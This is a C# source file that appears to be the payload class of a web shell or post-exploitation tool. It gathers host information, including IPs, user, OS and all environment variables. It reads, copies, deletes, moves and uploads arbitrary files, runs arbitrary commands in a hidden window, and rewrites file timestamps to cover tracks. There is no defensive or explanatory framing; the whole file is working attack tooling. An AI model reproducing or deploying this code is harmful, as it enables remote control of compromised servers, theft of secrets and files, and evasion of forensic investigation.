using System;
using System.IO;
using System.Text;
using System.Net;
using System.Collections;
using System.Reflection;
using System.Diagnostics;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Runtime.CompilerServices;

public class DynamicCode
{
    public static string GetAllIP()
    {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("[");
        ArrayList arrayList = new ArrayList();
        try
        {
            IPAddress[] hostAddresses = Dns.GetHostAddresses(Dns.GetHostName());
            foreach (IPAddress iPAddress in hostAddresses)
            {
                string text = iPAddress.ToString();
                if (!arrayList.Contains(text))
                {
                    arrayList.Add(text);
                    stringBuilder.Append(iPAddress.ToString() + ",");
                }
            }
            stringBuilder.Remove(stringBuilder.Length - 1, 1);
        }
        catch (Exception ex)
        {
            stringBuilder.Append(ex.Message);
        }
        stringBuilder.Append("]");
        return stringBuilder.ToString();
    }
    public string getBasicsInfo(string[] args)
    {
        string text = "";
        string arg = string.Join(";", Environment.GetLogicalDrives()) + ";";
        string text2 = "";
        string text3 = "";
        text += string.Format("{0} | {1}\n", "FileRoot", arg);
        text += string.Format("{0} | {1}\n", "CurrentDir", Environment.CurrentDirectory);
        try
        {
            object value = Assembly.Load("System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a").GetType("System.Web.HttpContext").GetProperty("Current")
                .GetValue(null, new object[0]);
            object value2 = value.GetType().GetProperty("Server").GetValue(value, new object[0]);
            string arg2 = (string)value2.GetType().GetMethod("MapPath", new Type[1] { typeof(string) }).Invoke(value2, new object[1] { "." });
            text += string.Format("{0} | {1}\n", "CurrentWebDir", arg2);
        }
        catch (Exception)
        {
        }
        try
        {
            text += string.Format("{0} | {1}\n", "AssemblyLocation", GetType().Assembly.Location);
            text += string.Format("{0} | {1}\n", "AssemblyCodeBase", GetType().Assembly.CodeBase);
        }
        catch (Exception)
        {
        }
        text += string.Format("{0} | {1}\n", "OsInfo", Environment.OSVersion);
        text += string.Format("{0} | {1}\n", "CurrentUser", Environment.UserName);
        text += string.Format("{0} | {1}\n", "ProcessArch", (IntPtr.Size == 8) ? "x64" : "x86");
        try
        {
            string text4 = Path.GetTempPath();
            if (!text4.EndsWith("\\") && !text4.EndsWith("/"))
            {
                text4 += Path.PathSeparator;
            }
            text += string.Format("{0} | {1}\n", "TempDirectory", text4);
        }
        catch (Exception)
        {
            text += string.Format("{0} | {1}\n", "TempDirectory", "c:/windows/temp/");
        }
        text += string.Format("{0} | {1}\n", "IPList", GetAllIP());
        PropertyInfo[] properties = typeof(Environment).GetProperties(BindingFlags.Static | BindingFlags.Public);
        for (int i = 0; i < properties.Length; i++)
        {
            text2 = properties[i].Name;
            text3 = properties[i].GetValue(null, null).ToString();
            if (!"StackTrace".Equals(text2) && !"NewLine".Equals(text2) && text3 != null)
            {
                // text += $"{text2} : {text3}\n";
                text += text2+" | "+text3+"\n";

            }
        }
        try
        {
            IDictionary environmentVariables = Environment.GetEnvironmentVariables();
            foreach (object key in environmentVariables.Keys)
            {
                // text += $"{key} : {environmentVariables[key]}\n";
                text += key+" | "+environmentVariables[key]+"\n";

            }
        }
        catch (Exception ex4)
        {
            text = text + ex4.Message + "\n";
        }
        return text;
    }

    public string readFile(string[] args)
    {
        string text = args[0];
        if (text != null && text.Trim().Length > 0)
        {
            try
            {
                if (File.Exists(text))
                {
                    byte[] array = new byte[(int)new FileInfo(text).Length];
                    int num = 0;
                    FileStream fileStream = new FileStream(text, FileMode.Open, FileAccess.Read, FileShare.Read);
                    while ((num += fileStream.Read(array, num, array.Length - num)) < array.Length)
                    {
                    }
                    fileStream.Close();
                    return Encoding.UTF8.GetString(array);
                }
                return "file does not exist";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
        return "No parameter fileName";
    }


    public string copyFile(string[] args)
    {
        string text = args[0];
        string text2 = args[1];
        if (text != null && text2 != null)
        {
            if (File.Exists(text))
            {
                if (File.Exists(text2))
                {
                    File.Delete(text2);
                }
                File.Copy(text, text2, true);
                return "ok";
            }
            return "The target does not exist or is not a file";
        }
        return "No parameter srcFileName,destFileName";
    }

    public string deleteFile(string[] args)
    {
        string text = args[0];
        if (text != null && text.Trim().Length > 0)
        {
            try
            {
                File.Delete(text);
                return "ok";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
        return "No parameter fileName";
    }


    public string execCommand(string[] args)
    {
        string text = args[0];
        if (text != null && text.Length > 0)
        {
            try
            {
                Process process = new Process();
                string text2 = null;
                if(args.Length > 1){
                    text2 = args[1];
                }
                if (process != null)
                {
                    process.StartInfo.FileName = text;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.RedirectStandardInput = true;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    if (text2 != null)
                    {
                        process.StartInfo.Arguments = text2;
                    }
                    try
                    {
                        try
                        {
                            process.Start();
                        }
                        catch (Exception ex)
                        {
                            return "cannot start process errMsg:"+ex.Message;
                        }
                        process.StandardInput.AutoFlush = true;
                        string text3 = process.StandardOutput.ReadToEnd();
                        text3 += process.StandardError.ReadToEnd();
                        process.WaitForExit();
                        process.Close();
                        return text3;
                    }
                    catch (Exception ex2)
                    {
                        return "runtimeException errMsg:"+ex2.Message;
                    }
                }
                return "cannot new Process";
            }
            catch (Exception ex3)
            {
                return ex3.Message;
            }
        }
        return "executableFile is null";
    }


    public FileAttr GetFileAttr(string fileName)
    {
        FileAttr fileAttr = new FileAttr();
        try
        {
            foreach (FileSystemAccessRule accessRule in new DirectoryInfo(fileName).GetAccessControl().GetAccessRules(true, true, typeof(NTAccount)))
            {
                FileSystemRights fileSystemRights = accessRule.FileSystemRights;
                if (accessRule.AccessControlType == AccessControlType.Deny)
                {
                    if ((fileSystemRights & FileSystemRights.Read) != 0)
                    {
                        fileAttr.Read = false;
                    }
                    if ((fileSystemRights & FileSystemRights.Write) != 0)
                    {
                        fileAttr.Write = false;
                    }
                    if ((fileSystemRights & FileSystemRights.ExecuteFile) != 0)
                    {
                        fileAttr.Execute = false;
                    }
                }
            }
        }
        catch (Exception)
        {
        }
        return fileAttr;
    }

    public string getFile(string[] args)
    {
        Hashtable hashtable = new Hashtable();
        string text = args[0];
        if(File.Exists(text))
        {
            hashtable["currentDir"] = Path.GetDirectoryName(text);
            Hashtable hashtable3 = new Hashtable();
            FileInfo fileInfo = new FileInfo(text);
            hashtable3["name"] = fileInfo.Name;
            hashtable3["is_file"] = 1;
            hashtable3["datetime"] = fileInfo.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss");
            hashtable3["size"] = fileInfo.Length;
            hashtable3["permission"] = GetFileAttr(fileInfo.FullName).ToString();
            hashtable["1"] = hashtable3;
            hashtable["count"] = 1;
        }
        else if (text != null && text.Length > 0)
        {
            text += "/";
            try
            {
                DirectoryInfo directoryInfo = new DirectoryInfo(text);
                FileInfo[] files = directoryInfo.GetFiles();
                DirectoryInfo[] directories = directoryInfo.GetDirectories();
                string fullName = directoryInfo.FullName;
                hashtable["currentDir"] = fullName;
                int num = 0;
                for (int i = 0; i < directories.Length; i++)
                {
                    Hashtable hashtable2 = new Hashtable();
                    try
                    {
                        DirectoryInfo directoryInfo2 = directories[i];
                        hashtable2["name"] = directoryInfo2.Name;
                        hashtable2["is_file"] = 0;
                        hashtable2["datetime"] = directoryInfo2.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss");
                        hashtable2["size"] = 4096;
                        hashtable2["permission"] = GetFileAttr(directoryInfo2.FullName).ToString();
                    }
                    catch (Exception ex)
                    {
                        hashtable2["errMsg"] = ex.Message;
                    }
                    hashtable[num.ToString()] = hashtable2;
                    num++;
                }
                for (int j = 0; j < files.Length; j++)
                {
                    Hashtable hashtable3 = new Hashtable();
                    try
                    {
                        FileInfo fileInfo = files[j];
                        hashtable3["name"] = fileInfo.Name;
                        hashtable3["is_file"] = 1;
                        hashtable3["datetime"] = fileInfo.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss");
                        hashtable3["size"] = fileInfo.Length;
                        hashtable3["permission"] = GetFileAttr(fileInfo.FullName).ToString();
                    }
                    catch (Exception ex2)
                    {
                        hashtable3["errMsg"] = ex2.Message;
                    }
                    hashtable[num.ToString()] = hashtable3;
                    num++;
                }
                hashtable["count"] = num.ToString();
            }
            catch (Exception ex3)
            {
                hashtable["errMsg"] = ex3.Message;
            }
        }
        else
        {
            hashtable["errMsg"] = "No parameter dirName";
        }
        
        string result = "";
        // Response.Write("{");
        result += "{";
        int count = hashtable.Count;
        int index = 0;
        foreach (DictionaryEntry de in hashtable)
        {
            // Response.Write(string.Format("\"{0}\":[", de.Key));
            result += string.Format("\"{0}\":[", de.Key);

            if (de.Value is Hashtable)
            {
                Hashtable nestedHashtable = (Hashtable)de.Value;
                int nestedCount = nestedHashtable.Count;
                int nestedIndex = 0;

                foreach (DictionaryEntry ae in nestedHashtable)
                {
                    // Response.Write(string.Format("{{\"{0}\":\"{1}\"}}", ae.Key, ae.Value));
                    result += string.Format("{{\"{0}\":\"{1}\"}}", ae.Key, ae.Value);
                    if (nestedIndex < nestedCount - 1)
                    {
                        // Response.Write(",");
                        result += ",";
                    }
                    nestedIndex++;
                }
            }
            else
            {
                // Response.Write(string.Format("\"{0}\"", de.Value));
                result += string.Format("\"{0}\"", de.Value);
            }

            if (index < count - 1)
            {
                // Response.Write("],");
                result += "],";
            }
            else
            {
                // Response.Write("]");
                result += "]";
            }
            index++;
        }
        // Response.Write("}");
        result += "}";
        return (result);
    }

    public string moveFile(string[] args)
    {
        string text = args[0];
        string text2 = args[1];
        if (text != null && text2 != null && text.Trim().Length > 0 && text2.Trim().Length > 0)
        {
            try
            {
                if (File.Exists(text))
                {
                    File.Move(text, text2);
                    return "ok";
                }
                if (Directory.Exists(text))
                {
                    Directory.Move(text, text2);
                    return "ok";
                }
                return "The target does not exist";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
        return "No parameter srcFileName,destFileName";
    }


    public string modifyFileTimeAttr(string[] args)
    {
        try
        {
            string result = "";
            DateTime dateTime = DateTime.Parse(args[1]);
            result += "historyLastAccessTime: "+File.GetLastAccessTime(args[0])+"\n";
            result += "historyCreationTime: "+File.GetCreationTime(args[0])+"\n";
            result += "historyLastAccessTime: "+File.GetLastWriteTime(args[0])+"\n";
            File.SetLastAccessTime(args[0], dateTime);
            File.SetCreationTime(args[0], dateTime);
            File.SetLastWriteTime(args[0], dateTime);
            result += "nowLastAccessTime: "+File.GetLastAccessTime(args[0])+"\n";
            result += "nowCreationTime: "+File.GetCreationTime(args[0])+"\n";
            result += "nowLastAccessTime: "+File.GetLastWriteTime(args[0])+"\n";
            return result;
        }
        catch (Exception ex)
        {
            return ex.Message;
        }
    }


    public string uploadFile(string[] args)
    {
        string text = args[0];
        byte[] byteArray = Convert.FromBase64String(args[1]);
        if (text != null && byteArray != null)
        {
            try
            {
                FileStream fileStream = new FileStream(text, FileMode.OpenOrCreate, FileAccess.Write, FileShare.Write);
                fileStream.Write(byteArray, 0, byteArray.Length);
                fileStream.Close();
                return "ok";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
        return "No parameter fileName and fileValue";
    }
}


public class FileAttr
{
	[CompilerGenerated]
	private bool _003CRead_003Ek__BackingField;

	[CompilerGenerated]
	private bool _003CWrite_003Ek__BackingField;

	[CompilerGenerated]
	private bool _003CExecute_003Ek__BackingField;

	public bool Read
	{
		[CompilerGenerated]
		get
		{
			return _003CRead_003Ek__BackingField;
		}
		[CompilerGenerated]
		set
		{
			_003CRead_003Ek__BackingField = value;
		}
	}

	public bool Write
	{
		[CompilerGenerated]
		get
		{
			return _003CWrite_003Ek__BackingField;
		}
		[CompilerGenerated]
		set
		{
			_003CWrite_003Ek__BackingField = value;
		}
	}

	public bool Execute
	{
		[CompilerGenerated]
		get
		{
			return _003CExecute_003Ek__BackingField;
		}
		[CompilerGenerated]
		set
		{
			_003CExecute_003Ek__BackingField = value;
		}
	}

	public FileAttr()
	{
		Read = true;
		Write = true;
		Execute = true;
	}

	public override string ToString()
	{
		string text = string.Format("{0}{1}{2}", Read ? "R" : "", Write ? "W" : "", Execute ? "X" : "");
		if (text.Length <= 0)
		{
			return "F";
		}
		return text;
	}
}
